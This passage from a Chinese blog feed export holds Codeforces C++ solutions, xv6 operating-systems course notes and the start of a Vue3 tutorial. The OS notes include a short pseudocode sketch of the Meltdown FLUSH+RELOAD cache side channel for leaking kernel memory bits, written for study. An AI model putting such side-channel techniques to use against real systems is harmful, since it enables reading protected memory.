</span><br><span class="line"> </span><br><span class="line">    cout &lt;&lt; max_petals &lt;&lt; endl;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>jiangly的题解，只能说不愧是jiangly，用上了很多cpp特性，从这里的边界处理学到了许多。特别是<code>max</code>和<code>min</code>的应用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2e5</span><span class="number">+10</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    ll m;</span><br><span class="line">    ll ans = <span class="number">0</span>;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    map&lt;<span class="type">int</span>, <span class="type">int</span>&gt;   mp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x;</span><br><span class="line">        cin &gt;&gt; x;</span><br><span class="line">        mp[x]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;[x, y] : mp) <span class="comment">//遍历map元素</span></span><br><span class="line">    &#123;</span><br><span class="line">      ans = <span class="built_in">max</span>(ans, <span class="number">1LL</span> * x * <span class="built_in">min</span>&lt;ll&gt;(y, m/x));    <span class="comment">//能容纳的最大值</span></span><br><span class="line">      <span class="keyword">if</span>(mp.<span class="built_in">find</span>(x + <span class="number">1</span>) != mp.<span class="built_in">end</span>())</span><br><span class="line">      &#123;</span><br><span class="line">            <span class="type">int</span> z = mp[x + <span class="number">1</span>];      <span class="comment">//取下一元素</span></span><br><span class="line">             <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= y &amp;&amp; <span class="number">1LL</span> * i * x &lt;= m; i++) &#123;     <span class="comment">//尝试将此节点与下一节点组合</span></span><br><span class="line">                ans = std::<span class="built_in">max</span>(ans, <span class="number">1LL</span> * i * x + <span class="number">1LL</span> * (x + <span class="number">1</span>) * std::<span class="built_in">min</span>&lt;ll&gt;(z, (m - <span class="number">1LL</span> * i * x) / (x + <span class="number">1</span>)));</span><br><span class="line">            &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> t ;</span><br><span class="line">    cin &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span> (t--)</span><br><span class="line">        <span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="B2"><a href="#B2" class="headerlink" title="B2"></a>B2</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240725111042778.png" alt="image-20240725111042778"></p><p>一个女孩为她的生日准备一个花束。花店里有 n 种不同类型的花，每种花的花瓣数和数量都被给出。每朵花的价格等于它的花瓣数。女孩希望组成一个花束，使得花束中的所有花的花瓣数之差不超过1，并且总花瓣数尽可能大。她有 m 枚硬币作为预算，不能超过这个预算。</p><p>这里的话，我们需要遍历每种花。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2e5</span><span class="number">+10</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="type">int</span> n;</span><br><span class="line">    ll m;</span><br><span class="line">    std::cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    </span><br><span class="line">    std::map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; f;</span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        std::cin &gt;&gt; a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> c;</span><br><span class="line">        std::cin &gt;&gt; c;</span><br><span class="line">        f[a[i]] = c;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ll ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> [x, y] : f) &#123;</span><br><span class="line">        <span class="comment">// 计算仅用花瓣数为 x 的花时的最大花瓣数</span></span><br><span class="line">        ans = std::<span class="built_in">max</span>(ans, <span class="number">1LL</span> * x * std::<span class="built_in">min</span>&lt;ll&gt;(y, m / x));      </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (f.<span class="built_in">find</span>(x + <span class="number">1</span>) != f.<span class="built_in">end</span>()) &#123;     <span class="comment">//元素按照升序遍历。</span></span><br><span class="line">            <span class="type">int</span> z = f[x + <span class="number">1</span>];</span><br><span class="line">            ll c;</span><br><span class="line">             <span class="comment">// 如果花瓣数为 x 的花可以完全使用预算</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">1LL</span> * x * y &gt;= m) &#123;</span><br><span class="line">                </span><br><span class="line">                c = m / x;      <span class="comment">//可以拿的第y种花的最大数</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="comment">// 计算最多能用多少花瓣数为 x + 1 的花</span></span><br><span class="line">                c = y + std::<span class="built_in">min</span>&lt;ll&gt;(z, (m - <span class="number">1LL</span> * x * y) / (x + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            ans = std::<span class="built_in">max</span>(ans, std::<span class="built_in">min</span>(m, c * x + std::<span class="built_in">min</span>&lt;ll&gt;(c, z)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; ans &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> t ;</span><br><span class="line">    cin &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span> (t--)</span><br><span class="line">        <span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一开始我搞不明白，如果升序遍历的话会不会有更优解（较大的花多买一点，较小的花买少一点）。后来一想，题意是花瓣数量相邻的花，如（6， 5）     （1 1 1 1 2 2），不管是（1112）还是（122）都达到最优解，其他情况可以类推。</p><p>参考：</p><p><a href="https://www.bilibili.com/video/BV1GE421w7VD/?vd_source=8b78b27b693441a5dd061787497a5237">Codeforces Round 961 (Div. 2)_哔哩哔哩_bilibili</a></p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
          <category> codeforces </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> codeforces </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XV6 0x12</title>
      <link href="/2024/07/22/OS/xv6_0x12/"/>
      <url>/2024/07/22/OS/xv6_0x12/</url>
      
        <content type="html"><![CDATA[<h1 id="视频结尾论文部分"><a href="#视频结尾论文部分" class="headerlink" title="视频结尾论文部分"></a>视频结尾论文部分</h1><h3 id="VM-FOR-APPLICATION"><a href="#VM-FOR-APPLICATION" class="headerlink" title="VM FOR APPLICATION"></a>VM FOR APPLICATION</h3><h4 id="原语"><a href="#原语" class="headerlink" title="原语"></a>原语</h4><p>论文论述的<code>(primitive)原语</code>及在<code>linux</code>上的实现</p><ul><li>trap 中断处理函数        ——&gt;  sigaction</li><li>prrt1 减少访问权限           ——&gt; mprotect</li><li>portN 节省TLB刷新          ——&gt; mprotect</li><li>unport增加访问权限         ——&gt; mprotect</li><li>dirty脏页</li><li>map2                                     ——&gt; mmap</li></ul><p>unix/linux today</p><ul><li><code>mmap，unmap</code> 将文件映射到虚拟内存，允许用指针来操作文件</li><li><p><code>mprotect</code>，修改页权限</p></li><li><p><code>sigaction</code>，定义信号处理程序</p></li></ul><p>USER-LEVEL TRAPS</p><p>用户可以设置中断处理程序。中断产生时，跳转到内核，内核发现用户设置了中断处理程序，跳转到中断处理程序，处理完后返回内核，然后内核恢复进程。</p><h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><p>calculate</p><p>我们可以将昂贵的函数计算值存储在内存中，若我们想控制计算值内存空间的大小，我们可以通过<code>mmap</code>和<code>munmap</code>保持计算值的内存大小。当计算值存储产生page fault时，我们可以选择一个牺牲页，将旧值替换为新值。</p><p>garbage collect</p><ul><li><p>A copying garbage collector：</p><ul><li><p>from space：原来的状态，包含垃圾，从root 遍历图，指针指向能遍历到的节点。</p><ul><li>​     forward(转发)</li></ul></li><li><p>to space：新的状态，将指针指向的节点复制过来。</p></li><li><p>Backer’s：  real time  &lt;— incrementally</p></li></ul></li></ul><ul><li><p>USE  VM</p><ul><li><p>通过map2将未扫描的页面映射到垃圾回收器，实现对未扫描的页面访问。</p></li><li><p>当页面访问时触发中断，在中断处理程序进行检查，将要访问的对象复制到to space。</p></li><li>//TODO    </li></ul></li></ul><h4 id="其他特性"><a href="#其他特性" class="headerlink" title="其他特性"></a>其他特性</h4><ul><li>5 levels pagetable：页表层数增加</li><li>ASIO ：异步I/O操作</li><li>刷新TLB</li><li>KPTI：将内核页表与用户空间页表隔离</li></ul><h3 id="OS-Organization"><a href="#OS-Organization" class="headerlink" title="OS Organization"></a>OS Organization</h3><h4 id="BIG-ABSTRACTION"><a href="#BIG-ABSTRACTION" class="headerlink" title="BIG ABSTRACTION"></a>BIG ABSTRACTION</h4><ul><li><p>PORTABILITY  可移植性</p></li><li><p>HIDE COMPLEXITY  隐藏底层的复杂性</p></li><li><p>RSESOURCE MANAGEMENT  资源管理</p></li><li><p>WHY NOT MONOLITHIC</p><ul><li>BIG -&gt; complex -&gt; bugs -&gt; <code>security</code></li><li>GENERAL -&gt; purpose -&gt;<code>slow</code></li><li><code>Design hard</code>（add module or remove module)</li></ul></li></ul><h4 id="MICRO-KERNELS-（微内核）"><a href="#MICRO-KERNELS-（微内核）" class="headerlink" title="MICRO KERNELS （微内核）"></a>MICRO KERNELS （微内核）</h4><ul><li>IDEA:TINY KERNEL<ul><li><code>(inter-process communication)IPC</code> 进程间通信</li><li><code>TASKS</code></li></ul></li><li><p>WHY</p><ul><li>small ——&gt; security</li><li>small ——&gt; verifiable  ——&gt; sel4</li><li>small ——&gt; fast</li><li>small ——&gt; flexibility</li><li>user level ——&gt; modular、customize</li></ul></li><li><p>CHALLENGES</p><ul><li>minimum syscall API            fork、exec</li><li>rest of O/S</li><li>fast IPC</li></ul></li></ul><h4 id="L4-kernel"><a href="#L4-kernel" class="headerlink" title="L4 kernel"></a>L4 kernel</h4><ul><li>small kernel</li><li>直接在L4微内核将linux内核作为<code>用户任务</code>运行。 <ul><li>用户任务通过定制的库将系统调用通过<code>IPC</code>发送给linux kernel</li><li>任务调度由 l4 kernel负责，linux无法调度。所以这里linux和task的关系更像<code>cs模型</code>。</li></ul></li><li>7 syscall     </li><li>support task、address space、thread、IPC<ul><li>如出现中断等：task通过IPC发送给中断处理程序（如缺页异常），中断处理用户程序将页映射到该task。</li></ul></li><li>fast ipc<ul><li>synchronous、unbuffered</li><li>想象当两个任务进行<code>pipe通信</code>，当一方send（a,&amp;addr1)且同时一方recv(b, &amp;addr2)时，我们能获得消息的源地址和目的地址。可以直接在两任务间进行IPC传输而不用进入L4内核（避免上下文切换、pipe缓冲区的复制、TLB刷新等操作）<ul><li>当消息可以被寄存器放下时，可以通过寄存器传输<code>registers —— zero copy</code></li><li>当消息很大时，我们甚至可以直接传输<code>页 PAGE</code></li><li><code>RPC</code><ul><li><code>call() —— send + recv</code></li><li>即我们的内核等基础服务像服务器那样监听任务传来的IPC通信讯息</li></ul></li></ul></li></ul></li><li>dual space mistake(双空间错误)<ul><li>linux将内核线程和用户进程映射到同一个页表，减少系统调用等开支。</li><li>即在L4 kernel，内核和用户进程是不共用页表的，但是论文作者想实现linux相似功能（即用户的虚拟地址对内核是可见的），为每个任务分配对应的linux内核副本。但是由于这样导致任务翻倍，效果反而大打折扣。</li></ul></li></ul><h3 id="virtual-machines"><a href="#virtual-machines" class="headerlink" title="virtual machines"></a>virtual machines</h3><h4 id="虚拟机分类"><a href="#虚拟机分类" class="headerlink" title="虚拟机分类"></a>虚拟机分类</h4><ul><li>软件模拟：VMware、qemu</li><li>硬件辅助：Microsoft Hyper-V、KVM</li></ul><p><del>pure virtual machines software：    so slow</del></p><h4 id="VMM实现"><a href="#VMM实现" class="headerlink" title="VMM实现"></a>VMM实现</h4><p>HOST:    VMM</p><p>USER:     guest Linux、guest windows </p><h4 id="TRAP-AND-EMULATE"><a href="#TRAP-AND-EMULATE" class="headerlink" title="TRAP-AND-EMULATE"></a>TRAP-AND-EMULATE</h4><ul><li><p>VMM在<code>监督者模式</code>下运行，用以执行特权指令，客户机（linux）做任何有特权的事时，都会进入trap，然后VMM模拟特权指令。</p></li><li><p>监视器为每个guest user维护一个virtual state，当执行特权指令时（如stvec、sepc），VMM<code>模拟</code>这些指令的操作，确保它们在虚拟机内部正确执行，同时保护物理硬件不受虚拟机直接访问的威胁。</p></li><li><p>客户机视角来看，VMM是不存在的，她们直接与硬件进行交互。</p></li><li><p><code>satp寄存器</code>：</p><ul><li><p>当客户机（guest）尝试访问内存时，它会使用虚拟地址（GVA - Guest Virtual Address）。</p></li><li><p>虚拟机监视器（VMM）需要将这个虚拟地址转换为物理地址（GPA - Guest Physical Address），以便在物理硬件上访问实际的内存位置。</p></li><li><p><strong>查看期望的客户机虚拟地址</strong>：客户机尝试访问的虚拟地址被记录下来。</p></li><li><p><strong>VMM映射</strong>：VMM使用其内部的数据结构（如影子页表）来查找GPA对应的物理地址。</p></li><li><p><strong>影子页表</strong>：<code>（shadow pagetable）影子页表</code>是VMM维护的一个数据结构，它将GVA映射到GPA，然后将GPA映射到实际的物理地址。</p></li><li><p><strong>设置satp</strong>：一旦VMM找到物理地址，它将这个物理地址加载到<code>satp</code>寄存器中</p></li></ul></li></ul><ul><li><p><strong>Device</strong></p><ul><li>EMULATION：将设备地址设置为不可访问，当客户机访问时，进入<code>trap</code><ul><li>客户机可以根据访问速度判度她们处在虚拟机中</li></ul></li><li>VIRTUAL DEVICE：设备和虚拟硬件是<code>解隅</code>的（减少trap），其设计和实现与物理硬件的接口相匹配</li><li>PASS-THRU：硬件支持虚拟机。</li></ul></li></ul><h4 id="HARDWARE-VMS-VT-s"><a href="#HARDWARE-VMS-VT-s" class="headerlink" title="HARDWARE VMS-VT-s"></a>HARDWARE VMS-VT-s</h4><ul><li>让客户机直接通过硬件执行特权指令<ul><li>虚拟机：”NON-ROOT”</li><li>VMM： “ROOT”</li><li>通过硬件支持特权指令的检测</li><li>通过VMM指令开启启动关闭客户机</li><li>EPT：VMM通过设置EPT指向一个页表来控制客户机可访问的物理内存 </li></ul></li></ul><h4 id="Dune（VT-X-support）"><a href="#Dune（VT-X-support）" class="headerlink" title="Dune（VT-X support）"></a>Dune（VT-X support）</h4><ul><li><p>进程通过Dune设置EPT实现独立的页表</p></li><li><p>获得user mode和 super mode</p><ul><li>沙箱支持，被检测的程序在用户状态下运行，检测程序在监督者模式下运行，使得可以追踪系统调用等情况</li><li>垃圾回收，可以对扫描过的节点检测PTE 的Dirty位来判断时候需要重新扫描。</li></ul></li></ul><h3 id="kernels-and-high-level-language"><a href="#kernels-and-high-level-language" class="headerlink" title="kernels and high level language"></a>kernels and high level language</h3><h4 id="C"><a href="#C" class="headerlink" title="C"></a>C</h4><ul><li><p>优点</p><ul><li><p>可以精确控制内存分配和释放</p></li><li><p>易于理解的代码（指linux之父能从c看到汇编（人肉编译器））</p></li><li><p>直接访问内存（通过指针）</p></li><li><p>低依赖，指通过几条汇编指令设置寄存器后即可跳转到C代码</p></li></ul></li><li><p>缺点</p><ul><li>缓冲区溢出</li><li>使用已经释放的内存</li><li>线程共享的内存释放问题</li></ul></li></ul><h4 id="高级语言"><a href="#高级语言" class="headerlink" title="高级语言"></a>高级语言</h4><ul><li>优点<ul><li>类型安全</li><li>垃圾回收机制</li><li>对并发的支持</li><li>支持更好的抽象，模块化代码</li></ul></li><li>缺点<ul><li>低性能<ul><li>边界检查，类型转换等操作消耗性能</li><li>垃圾回收</li></ul></li><li>不适用于内核编程<ul><li>不能直接访问内存</li><li>难以集成汇编，如c和cpp提供了内联汇编的功能，也可以在链接时链接到汇编程序‘’</li><li>编程语言本身支持的并发与内核需要的并发并不一致</li></ul></li></ul></li></ul><h3 id="meltdown"><a href="#meltdown" class="headerlink" title="meltdown"></a>meltdown</h3><ul><li><p><code>KASLR</code>：内核地址随机化</p></li><li><p>预测执行：根据分支预测的结果来提前执行指令的过程。</p><ul><li><p>如果预测正确，则能显著提升性能；如果预测失败，</p></li><li><p>则所有推测执行的结果会被抛弃，并且流水线会被清空。</p></li><li><p><code>影子寄存器</code>暂存推测执行的结果，直到分支预测的结果被确认。</p></li></ul></li></ul><ul><li>漏洞原因：<code>intel cpu</code>在执行命令时会先加载内存的值，当加载退出时才会检测标志</li></ul><ul><li><p>caches结构：</p><ul><li><p>core</p><p>L1:     va  |  data | perms            TLB:   <code>va -&gt; pa</code></p><p>L2、L3：  pa | data</p><p>RAM</p></li><li><p>在多核处理器系统中，L2缓存通常是每个核心私有的，而L3缓存是多个核心共享的。如果L2和L3缓存使用虚拟地址，那么在处理缓存一致性问题时会变得复杂，因为不同的核心可能有不同的虚拟地址映射到相同的物理地址。使用物理地址可以简化这个问题，因为物理地址在所有核心之间是一致的。</p></li></ul></li></ul><ul><li><p>缓存刷新：FLUSH + RELOAD    —-x</p><ul><li>clFlush x 刷新缓冲</li><li>f()</li><li>a = rdtsc  获取加载时间</li><li>junk = x</li><li>b = rdtsc   再次获取时间</li><li>b - a = c 若c时间短则说明使用了x内存。</li></ul></li><li><p>漏洞原理：逐步获取内核每一位</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">8192</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//FLUSH + RELOAD</span></span><br><span class="line">clflush buf[<span class="number">0</span>];</span><br><span class="line">clfush bf[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//消耗cpu时间的指令，延长`加载`退出时间</span></span><br><span class="line"></span><br><span class="line">r1 = kernel addr;</span><br><span class="line">r2 = r1 &amp; <span class="number">1</span>;</span><br><span class="line">r2 = r2 * <span class="number">4096</span>;<span class="comment">//r2为0或4098</span></span><br><span class="line">r3 = buf[r2];<span class="comment">//将buf[r2]加载到缓存中</span></span><br><span class="line">&lt; handle the page fault from <span class="string">&quot;r2 = *r1&quot;</span> &gt;<span class="comment">//不恢复缓存   </span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//计算加载时间，通过时长判断是否在缓存</span></span><br><span class="line"><span class="comment">// the reload of flush+reload</span></span><br><span class="line">a = rdtsc;</span><br><span class="line">r0 = buf[<span class="number">0</span>];</span><br><span class="line">b = rdtsc;</span><br><span class="line">r1 = buf[<span class="number">4096</span>];</span><br><span class="line">c = rdtsc</span><br><span class="line">    <span class="keyword">if</span> b - a &lt; c - b<span class="comment">//buf[0]在缓存中</span></span><br><span class="line"> <span class="comment">//0 &amp; 1 = 0, 0 * 4096 = 0,则该bit为0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><ul><li>解决方案：<ul><li>像xv6将内核和用户空间反别使用虚拟地址空间</li><li>在读取指令时获取指令权限</li><li>通过操作系统修复</li></ul></li></ul><h3 id="RCU（读远多于写）"><a href="#RCU（读远多于写）" class="headerlink" title="RCU（读远多于写）"></a>RCU（读远多于写）</h3><ul><li><p>multiple reader，only one writer</p><ul><li>维持write锁和read锁（一个变量n，-1表示写，0表示没有进程使用，&gt;=1表示有一个或多个读者），通过<code>Compare and Swap（CAS）</code>实现原子操作<ul><li>如果有多个 读写者，则陷入竞争</li><li>如果是多核机器，需要保持<code>缓存一致性</code>（标记其他cpu的缓存无效），导致O(n^2)的消耗。</li></ul></li></ul></li><li><p>IDEA </p><ul><li>更新数据分配一个副本，再将指针指向副本（commit 原子的， 需要在编写时添加屏障（读写者都需要）），同时不要释放原来数据，因为可能有读者正在访问</li><li><code>延迟冻结</code><ul><li>读者不能进行上下文切换</li><li>将释放延迟到每个cpu至少切换过一次上下文。</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
          <category> xv6 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> xv6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue3学习</title>
      <link href="/2024/07/22/VUE3/vue3/"/>
      <url>/2024/07/22/VUE3/vue3/</url>
      
        <content type="html"><![CDATA[<p>​    </p><h1 id="VUE3"><a href="#VUE3" class="headerlink" title="VUE3"></a>VUE3</h1><p>VUE3:Typescript + 组合式API + setup语法糖</p><p>这里主要是来自b站尚硅谷VUE3的官方课堂笔记，有一些自己的修改。</p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>vite</p><ul><li><p>创建项目</p></li><li><p>由原生 ES 模块提供支持的现代前端开发与构建工具。</p></li><li>Vite 利用现代浏览器的原生 ES 模块导入和构建时预编译功能。</li><li>模块热更新。当文件更改时，Vite 只需要重建一小部分模块。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm create vue@latest      创建项目</span><br><span class="line">npm install   安装依赖</span><br><span class="line">npm run dev                开启项目</span><br></pre></td></tr></table></figure><p>目录结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── README.md</span><br><span class="line">├── env.d.ts//环境类型声明文件，定义文件类型</span><br><span class="line">├── index.html//应用的入口 HTML 文件</span><br><span class="line">├── node_modules//npm install下载的项目依赖</span><br><span class="line">├── package-lock.json//锁定依赖版本，确保每次安装依赖时的一致性。</span><br><span class="line">├── package.json//项目的配置文件</span><br><span class="line">├── public//存放静态资源（如图片、图标等）的文件夹</span><br><span class="line">├── src//源代码</span><br><span class="line">├── tsconfig.app.json//TypeScript 的配置文件</span><br><span class="line">├── tsconfig.json//定义 TypeScript 编译选项和编译范围。</span><br><span class="line">├── tsconfig.node.json// Node.js 环境的 TypeScript 编译设置。</span><br><span class="line">└── vite.config.ts//Vite 的配置文件</span><br></pre></td></tr></table></figure><p>vue渲染</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">index.html</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;&lt;/div&gt;//Vue 应用的挂载点。</span><br><span class="line">    &lt;script type=&quot;module&quot; src=&quot;/src/main.ts&quot;&gt;&lt;/script&gt;//解析 main.ts 文件，并执行其中的代码，初始化并挂载 Vue 应用。</span><br><span class="line">  &lt;/body&gt;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main.ts</span><br><span 